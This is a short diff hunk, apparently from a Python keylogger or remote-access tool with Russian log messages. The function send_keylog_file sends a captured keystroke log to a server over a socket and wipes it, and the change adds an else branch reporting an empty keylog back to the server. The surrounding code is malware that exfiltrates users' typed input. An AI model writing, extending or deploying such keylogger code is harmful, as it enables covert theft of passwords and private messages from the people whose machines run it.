@@ -174,6 +174,9 @@ def send_keylog_file(sock):
                 with open(keylogger_path, "w") as file:
                     file.write("")
                 logging.info("[+] Кейлог отправлен на сервер и очищен")
+            else:
+                reliable_send("[!!] Кейлог пуст", sock)
+                logging.warning("[!!] Кейлог пуст")
     except FileNotFoundError:
         reliable_send("[!!] Файл кейлогера не найден", sock)
         logging.error("[!!] Файл кейлогера не найден")
